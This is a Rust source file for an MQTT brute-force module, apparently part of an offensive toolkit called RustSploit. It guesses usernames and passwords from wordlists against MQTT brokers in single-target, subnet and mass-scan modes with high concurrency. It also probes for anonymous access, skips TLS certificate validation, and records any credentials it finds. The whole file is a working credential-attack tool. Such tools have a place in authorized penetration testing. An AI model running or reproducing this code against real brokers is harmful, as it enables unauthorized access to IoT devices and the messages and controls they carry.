//! MQTT Brute Force Module
//!
//! High-performance MQTT authentication testing with:
//! - TLS/SSL support (port 8883)
//! - Anonymous authentication detection
//! - Intelligent error classification
//! - Progress tracking and statistics
//! - Multiple attack modes (full combo, linear, single user/pass)

use anyhow::{anyhow, Context, Result};
use colored::*;
use std::io::Write;
use std::net::IpAddr;
use std::time::Duration;
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};

use crate::modules::creds::utils::{
    generate_combos_mode, parse_combo_mode, load_credential_file,
    is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
    run_subnet_bruteforce, BruteforceConfig, LoginResult, MassScanConfig, SubnetScanConfig,
};
use crate::utils::{
    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
    cfg_prompt_port, cfg_prompt_yes_no, get_filename_in_current_dir, load_lines, normalize_target,
};

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "MQTT Brute Force".to_string(),
        description: "High-performance MQTT authentication testing with TLS/SSL support, anonymous authentication detection, intelligent error classification, and multiple attack modes.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

// ============================================================================
// Constants
// ============================================================================

const MQTT_CONNECT_TIMEOUT_MS: u64 = 5000;
const MQTT_READ_TIMEOUT_MS: u64 = 3000;
// MQTT Protocol Constants
const MQTT_PACKET_CONNECT: u8 = 0x10;
const MQTT_PACKET_CONNACK: u8 = 0x20;
const MQTT_PACKET_DISCONNECT: u8 = 0xE0;
const MQTT_PROTOCOL_NAME: &[u8] = b"MQTT";
const MQTT_PROTOCOL_LEVEL_V311: u8 = 0x04;

// MQTT Connect Flags
const MQTT_FLAG_CLEAN_SESSION: u8 = 0x02;
const MQTT_FLAG_USERNAME: u8 = 0x80;
const MQTT_FLAG_PASSWORD: u8 = 0x40;

// MQTT Return Codes
#[derive(Debug, Clone, Copy, PartialEq)]
enum MqttReturnCode {
    Accepted,
    UnacceptableProtocol,
    IdentifierRejected,
    ServerUnavailable,
    BadCredentials,
    NotAuthorized,
    Unknown(u8),
}

impl MqttReturnCode {
    fn from_byte(b: u8) -> Self {
        match b {
            0x00 => Self::Accepted,
            0x01 => Self::UnacceptableProtocol,
            0x02 => Self::IdentifierRejected,
            0x03 => Self::ServerUnavailable,
            0x04 => Self::BadCredentials,
            0x05 => Self::NotAuthorized,
            _ => Self::Unknown(b),
        }
    }

    fn is_auth_failure(&self) -> bool {
        matches!(self, Self::BadCredentials | Self::NotAuthorized)
    }

    fn description(&self) -> &'static str {
        match self {
            Self::Accepted => "Connection Accepted",
            Self::UnacceptableProtocol => "Unacceptable Protocol Version",
            Self::IdentifierRejected => "Identifier Rejected",
            Self::ServerUnavailable => "Server Unavailable",
            Self::BadCredentials => "Bad Username or Password",
            Self::NotAuthorized => "Not Authorized",
            Self::Unknown(_) => "Unknown Return Code",
        }
    }
}

// ============================================================================
// Attack Result
// ============================================================================

#[derive(Debug)]
enum AttackResult {
    Success(String, String), // (username, password)
    AuthFailed,
    ConnectionError(String),
    ProtocolError(String),
}

// ============================================================================
// Main Entry Point
// ============================================================================

pub async fn run(target: &str) -> Result<()> {
    display_banner();

    // Check for Mass Scan Mode
    if is_mass_scan_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
        crate::mprintln!("{}", "[*] Mode: Mass Scan / Hose".yellow());

        let port = cfg_prompt_port("port", "MQTT Port (1883/8883)", 1883).await?;
        let use_tls = if port == 8883 {
            crate::mprintln!(
                "{}",
                "[*] Port 8883 detected - TLS enabled by default".blue()
            );
            true
        } else {
            cfg_prompt_yes_no("use_tls", "Use TLS/SSL?", false).await?
        };

        let username_wordlist =
            cfg_prompt_existing_file("username_wordlist", "Username wordlist file").await?;
        let password_wordlist =
            cfg_prompt_existing_file("password_wordlist", "Password wordlist file").await?;
        let users = std::sync::Arc::new(load_lines(&username_wordlist)?);
        let passes = std::sync::Arc::new(load_lines(&password_wordlist)?);
        if users.is_empty() {
            return Err(anyhow!("User list empty"));
        }
        if passes.is_empty() {
            return Err(anyhow!("Pass list empty"));
        }

        let client_id =
            cfg_prompt_default("client_id", "MQTT Client ID", "rustsploit_mqtt").await?;
        let client_id = std::sync::Arc::new(client_id);

        let cfg = MassScanConfig {
            protocol_name: "MQTT",
            default_port: port,
            state_file: "mqtt_brute_hose_state.log",
            default_output: "mqtt_brute_mass_results.txt",
            default_concurrency: 500,
        };

        return run_mass_scan(target, cfg, move |ip, port| {
            let users = users.clone();
            let passes = passes.clone();
            let cid = client_id.clone();
            async move {
                // TCP connect check
                if !crate::utils::tcp_port_open(ip, port, std::time::Duration::from_secs(3)).await {
                    return None;
                }

                let addr = format!("{}:{}", ip, port);
                for user in users.iter() {
                    for pass in passes.iter() {
                        match try_mqtt_auth(&addr, user, pass, &cid, use_tls).await {
                            AttackResult::Success(u, p) => {
                                let timestamp = chrono::Utc::now().format("%Y-%m-%dT%H:%M:%SZ");
                                let line = format!("[{}] {}:{}:{}:{}\n", timestamp, ip, port, u, p);
                                crate::mprintln!(
                                    "\r{}",
                                    format!("[+] FOUND: {}:{}:{}:{}", ip, port, u, p)
                                        .green()
                                        .bold()
                                );
                                return Some(line);
                            }
                            AttackResult::ConnectionError(e) => {
                                let err = e.to_lowercase();
                                if err.contains("refused")
                                    || err.contains("timeout")
                                    || err.contains("reset")
                                {
                                    return None;
                                }
                            }
                            _ => {}
                        }
                    }
                }
                None
            }
        })
        .await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());

        let port = cfg_prompt_port("port", "MQTT Port (1883/8883)", 1883).await?;
        let use_tls = if port == 8883 {
            true
        } else {
            cfg_prompt_yes_no("use_tls", "Use TLS/SSL?", false).await?
        };
        let username_wordlist =
            cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let password_wordlist =
            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&username_wordlist)?;
        let passes = load_lines(&password_wordlist)?;
        if users.is_empty() {
            return Err(anyhow!("User list empty"));
        }
        if passes.is_empty() {
            return Err(anyhow!("Pass list empty"));
        }

        let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000)
            .await? as usize;
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file(
            "output_file",
            "Output result file",
            "mqtt_subnet_results.txt",
        )
        .await?;
        let client_id =
            cfg_prompt_default("client_id", "MQTT Client ID", "rustsploit_mqtt").await?;

        return run_subnet_bruteforce(
            target,
            port,
            users,
            passes,
            &SubnetScanConfig {
                concurrency,
                verbose,
                output_file,
                service_name: "mqtt",
                jitter_ms: 0,
                source_module: "creds/generic/mqtt_bruteforce",
                skip_tcp_check: false,
            },
            move |ip: IpAddr, port: u16, user: String, pass: String| {
                let cid = client_id.clone();
                async move {
                    let addr = format!("{}:{}", ip, port);
                    match try_mqtt_auth(&addr, &user, &pass, &cid, use_tls).await {
                        AttackResult::Success(_, _) => LoginResult::Success,
                        AttackResult::AuthFailed => LoginResult::AuthFailed,
                        AttackResult::ConnectionError(e) => LoginResult::Error {
                            message: e,
                            retryable: true,
                        },
                        AttackResult::ProtocolError(e) => LoginResult::Error {
                            message: e,
                            retryable: true,
                        },
                    }
                }
            },
        )
        .await;
    }

    // --- Single Target Mode ---
    let normalized_target = normalize_target(&target.to_string())?;
    crate::mprintln!("{}", format!("[*] Target: {}", normalized_target).cyan());
    crate::mprintln!();

    // Port
    let port: u16 = cfg_prompt_port("port", "MQTT Port (1883/8883)", 1883).await?;

    // TLS auto-detection for port 8883
    let use_tls = if port == 8883 {
        crate::mprintln!(
            "{}",
            "[*] Port 8883 detected - TLS enabled by default".blue()
        );
        true
    } else {
        cfg_prompt_yes_no("use_tls", "Use TLS/SSL?", false).await?
    };

    // Anonymous authentication test
    let test_anonymous = cfg_prompt_yes_no(
        "test_anonymous",
        "Test anonymous authentication first?",
        true,
    )
    .await?;

    // Client ID
    let client_id = cfg_prompt_default("client_id", "MQTT Client ID", "rustsploit_mqtt").await?;

    // Wordlists
    let username_wordlist =
        cfg_prompt_existing_file("username_wordlist", "Username wordlist file").await?;
    let password_wordlist =
        cfg_prompt_existing_file("password_wordlist", "Password wordlist file").await?;

    // Concurrency
    let concurrency =
        cfg_prompt_int_range("concurrency", "Concurrent connections", 10, 1, 500).await? as usize;

    // Stop on first success
    let stop_on_success =
        cfg_prompt_yes_no("stop_on_success", "Stop on first valid login?", true).await?;

    // Save results
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(cfg_prompt_output_file("output_file", "Output file", "mqtt_brute_results.txt").await?)
    } else {
        None
    };

    // Verbose
    let verbose = cfg_prompt_yes_no("verbose", "Verbose output?", false).await?;

    // Combo mode
    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;

    // Load wordlists
    let usernames = load_lines(&username_wordlist)?;
    let passwords = load_lines(&password_wordlist)?;

    if usernames.is_empty() {
        return Err(anyhow!("Username wordlist is empty"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("Password wordlist is empty"));
    }

    crate::mprintln!("{}", format!("[*] Usernames: {}", usernames.len()).cyan());
    crate::mprintln!("{}", format!("[*] Passwords: {}", passwords.len()).cyan());
    crate::mprintln!(
        "{}",
        format!("[*] TLS: {}", if use_tls { "Enabled" } else { "Disabled" }).cyan()
    );

    let addr = format!("{}:{}", normalized_target, port);

    // Test anonymous authentication before bruteforce
    if test_anonymous {
        crate::mprintln!("{}", "[*] Testing anonymous authentication...".blue());
        match try_mqtt_auth(&addr, "", "", &client_id, use_tls).await {
            AttackResult::Success(_, _) => {
                crate::mprintln!("{}", "[+] ANONYMOUS ACCESS ALLOWED!".green().bold());
                {
                    let id = crate::cred_store::store_credential(
                        &normalized_target,
                        port,
                        "mqtt",
                        "(anonymous)",
                        "(no password)",
                        crate::cred_store::CredType::Password,
                        "creds/generic/mqtt_bruteforce",
                    )
                    .await;
                    if id.is_empty() { crate::meprintln!("[!] Failed to store credential"); }
                }
                if stop_on_success {
                    crate::mprintln!(
                        "{}",
                        format!("[+] Found 1 valid credential(s):").green().bold()
                    );
                    crate::mprintln!("  {} {}  (anonymous):(no password)", "✓".green(), addr);
                    return Ok(());
                }
            }
            AttackResult::AuthFailed => {
                crate::mprintln!(
                    "{}",
                    "[-] Anonymous access denied (authentication required)".yellow()
                );
            }
            AttackResult::ConnectionError(e) => {
                crate::mprintln!(
                    "{}",
                    format!("[!] Connection error during anonymous test: {}", e).yellow()
                );
                crate::mprintln!("{}", "[*] Continuing with credential brute force...".blue());
            }
            AttackResult::ProtocolError(e) => {
                crate::mprintln!("{}", format!("[!] Protocol error: {}", e).yellow());
            }
        }
        crate::mprintln!();
    }

    // Generate credential combos
    let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
        combos.extend(load_credential_file(&cred_path)?);
    }

    // Build the try_login closure capturing MQTT-specific config
    let try_login = move |_target: String, _port: u16, user: String, pass: String| {
        let cid = client_id.clone();
        async move {
            let addr = format!("{}:{}", _target, _port);
            match try_mqtt_auth(&addr, &user, &pass, &cid, use_tls).await {
                AttackResult::Success(_, _) => LoginResult::Success,
                AttackResult::AuthFailed => LoginResult::AuthFailed,
                AttackResult::ConnectionError(e) => LoginResult::Error {
                    message: e,
                    retryable: true,
                },
                AttackResult::ProtocolError(e) => LoginResult::Error {
                    message: e,
                    retryable: true,
                },
            }
        }
    };

    let result = run_bruteforce(
        &BruteforceConfig {
            target: normalized_target,
            port,
            concurrency,
            stop_on_success,
            verbose,
            delay_ms: 0,
            max_retries: 3,
            service_name: "mqtt",
            jitter_ms: 0,
            source_module: "creds/generic/mqtt_bruteforce",
        },
        combos,
        try_login,
    )
    .await?;

    result.print_found();
    if let Some(ref path) = save_path {
        result.save_to_file(path)?;
    }

    // Unknown / errored attempts
    if !result.errors.is_empty() {
        crate::mprintln!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored MQTT responses.",
                result.errors.len()
            )
            .yellow()
            .bold()
        );
        if cfg_prompt_yes_no(
            "save_unknown_responses",
            "Save unknown responses to file?",
            true,
        )
        .await?
        {
            let default_name = "mqtt_unknown_responses.txt";
            let fname = cfg_prompt_output_file(
                "unknown_responses_file",
                "What should the unknown results be saved as?",
                default_name,
            )
            .await?;
            let filename = get_filename_in_current_dir(&fname);
            use std::os::unix::fs::OpenOptionsExt;
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            opts.mode(0o600);
            match opts.open(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# MQTT Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in &result.errors {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    file.flush()?;
                    crate::mprintln!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(())
}

fn display_banner() {
    crate::mprintln!(
        "{}",
        "╔═══════════════════════════════════════════════════════════╗".cyan()
    );
    crate::mprintln!(
        "{}",
        "║           MQTT Brute Force Module v2.0                    ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Supports TLS/SSL, Anonymous Auth, Full Combo Mode       ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "╚═══════════════════════════════════════════════════════════╝".cyan()
    );
    crate::mprintln!();
}

// ============================================================================
// MQTT Protocol Implementation
// ============================================================================

async fn try_mqtt_auth(
    addr: &str,
    username: &str,
    password: &str,
    client_id: &str,
    use_tls: bool,
) -> AttackResult {
    // Connect with timeout
    let stream = match crate::utils::network::tcp_connect(addr, Duration::from_millis(MQTT_CONNECT_TIMEOUT_MS)).await {
        Ok(s) => s,
        Err(e) => return AttackResult::ConnectionError(e.to_string()),
    };

    if use_tls {
        // Wrap TCP stream with TLS for secure MQTT (port 8883)
        use tokio_rustls::rustls::pki_types::ServerName;

        let connector = crate::native::async_tls::make_dangerous_tls_connector();

        // Extract hostname from addr (strip port)
        let hostname = addr
            .rsplit_once(':')
            .map(|(h, _)| h.trim_matches(|c| c == '[' || c == ']'))
            .unwrap_or(addr);

        let server_name = match ServerName::try_from(hostname.to_string()) {
            Ok(sn) => sn,
            Err(e) => return AttackResult::ConnectionError(format!("Invalid server name: {}", e)),
        };

        let tls_stream = match tokio::time::timeout(
            Duration::from_millis(MQTT_CONNECT_TIMEOUT_MS),
            connector.connect(server_name, stream),
        )
        .await
        {
            Ok(Ok(s)) => s,
            Ok(Err(e)) => {
                return AttackResult::ConnectionError(format!("TLS handshake failed: {}", e))
            }
            Err(_) => return AttackResult::ConnectionError("TLS handshake timeout".to_string()),
        };

        match mqtt_handshake(tls_stream, username, password, client_id).await {
            Ok(true) => AttackResult::Success(username.to_string(), password.to_string()),
            Ok(false) => AttackResult::AuthFailed,
            Err(e) => AttackResult::ProtocolError(e.to_string()),
        }
    } else {
        match mqtt_handshake(stream, username, password, client_id).await {
            Ok(true) => AttackResult::Success(username.to_string(), password.to_string()),
            Ok(false) => AttackResult::AuthFailed,
            Err(e) => AttackResult::ProtocolError(e.to_string()),
        }
    }
}

async fn mqtt_handshake<S>(
    mut stream: S,
    username: &str,
    password: &str,
    client_id: &str,
) -> Result<bool>
where
    S: AsyncRead + AsyncWrite + Unpin,
{
    // Build CONNECT packet
    let packet = build_connect_packet(username, password, client_id)?;

    // Send CONNECT
    stream
        .write_all(&packet)
        .await
        .context("Failed to send CONNECT")?;
    stream.flush().await.context("Failed to flush")?;

    // Read CONNACK
    let mut header = [0u8; 2];
    let read_result = tokio::time::timeout(
        Duration::from_millis(MQTT_READ_TIMEOUT_MS),
        stream.read_exact(&mut header),
    )
    .await;

    match read_result {
        Ok(Ok(_)) => {}
        Ok(Err(e)) => return Err(anyhow!("Read error: {}", e)),
        Err(_) => return Err(anyhow!("Read timeout")),
    }

    if header[0] != MQTT_PACKET_CONNACK {
        return Err(anyhow!("Expected CONNACK (0x20), got 0x{:02x}", header[0]));
    }

    let remaining_len = header[1] as usize;
    if remaining_len < 2 {
        return Err(anyhow!("CONNACK too short"));
    }

    if remaining_len > 64 {
        return Err(anyhow!("CONNACK too large: {} bytes", remaining_len));
    }
    let mut payload = vec![0u8; remaining_len];
    tokio::time::timeout(
        Duration::from_millis(MQTT_READ_TIMEOUT_MS),
        stream.read_exact(&mut payload),
    )
    .await
    .context("Read timeout")?
    .context("Failed to read CONNACK payload")?;

    // Parse return code (byte 1 of variable header)
    let return_code = MqttReturnCode::from_byte(payload[1]);

    // Send DISCONNECT on success
    if return_code == MqttReturnCode::Accepted {
        if let Err(e) = stream.write_all(&[MQTT_PACKET_DISCONNECT, 0x00]).await { crate::meprintln!("[!] Write error: {}", e); }
        return Ok(true);
    }

    if return_code.is_auth_failure() {
        return Ok(false);
    }

    // ServerUnavailable (0x03) is transient — return Ok(false) so engine retries
    // UnacceptableProtocol (0x01) and IdentifierRejected (0x02) are config errors — not retryable
    match return_code {
        MqttReturnCode::ServerUnavailable => Ok(false),
        _ => Err(anyhow!("MQTT error: {}", return_code.description())),
    }
}

fn build_connect_packet(username: &str, password: &str, client_id: &str) -> Result<Vec<u8>> {
    if username.len() > 65535 {
        return Err(anyhow!("Username exceeds MQTT max length (65535 bytes)"));
    }
    if password.len() > 65535 {
        return Err(anyhow!("Password exceeds MQTT max length (65535 bytes)"));
    }
    if client_id.len() > 65535 {
        return Err(anyhow!("Client ID exceeds MQTT max length (65535 bytes)"));
    }

    let mut var_header = Vec::new();

    // Protocol Name
    var_header.extend_from_slice(&(MQTT_PROTOCOL_NAME.len() as u16).to_be_bytes());
    var_header.extend_from_slice(MQTT_PROTOCOL_NAME);

    // Protocol Level
    var_header.push(MQTT_PROTOCOL_LEVEL_V311);

    // Connect Flags
    let mut flags = MQTT_FLAG_CLEAN_SESSION;
    if !username.is_empty() {
        flags |= MQTT_FLAG_USERNAME;
    }
    if !password.is_empty() {
        flags |= MQTT_FLAG_PASSWORD;
    }
    var_header.push(flags);

    // Keep Alive (60 seconds)
    var_header.extend_from_slice(&60u16.to_be_bytes());

    // Payload
    let mut payload = Vec::new();

    // Client ID (required)
    let client_id_bytes = client_id.as_bytes();
    payload.extend_from_slice(&(client_id_bytes.len() as u16).to_be_bytes());
    payload.extend_from_slice(client_id_bytes);

    // Username (optional)
    if !username.is_empty() {
        let username_bytes = username.as_bytes();
        payload.extend_from_slice(&(username_bytes.len() as u16).to_be_bytes());
        payload.extend_from_slice(username_bytes);
    }

    // Password (optional)
    if !password.is_empty() {
        let password_bytes = password.as_bytes();
        payload.extend_from_slice(&(password_bytes.len() as u16).to_be_bytes());
        payload.extend_from_slice(password_bytes);
    }

    // Calculate remaining length
    let remaining_length = var_header.len() + payload.len();
    let remaining_bytes = encode_remaining_length(remaining_length)?;

    // Build final packet
    let mut packet =
        Vec::with_capacity(1 + remaining_bytes.len() + var_header.len() + payload.len());
    packet.push(MQTT_PACKET_CONNECT);
    packet.extend_from_slice(&remaining_bytes);
    packet.extend_from_slice(&var_header);
    packet.extend_from_slice(&payload);

    Ok(packet)
}

fn encode_remaining_length(mut length: usize) -> Result<Vec<u8>> {
    if length > 268_435_455 {
        return Err(anyhow!("Packet too large"));
    }

    let mut bytes = Vec::with_capacity(4);
    loop {
        let mut byte = (length % 128) as u8;
        length /= 128;
        if length > 0 {
            byte |= 0x80;
        }
        bytes.push(byte);
        if length == 0 {
            break;
        }
    }
    Ok(bytes)
}
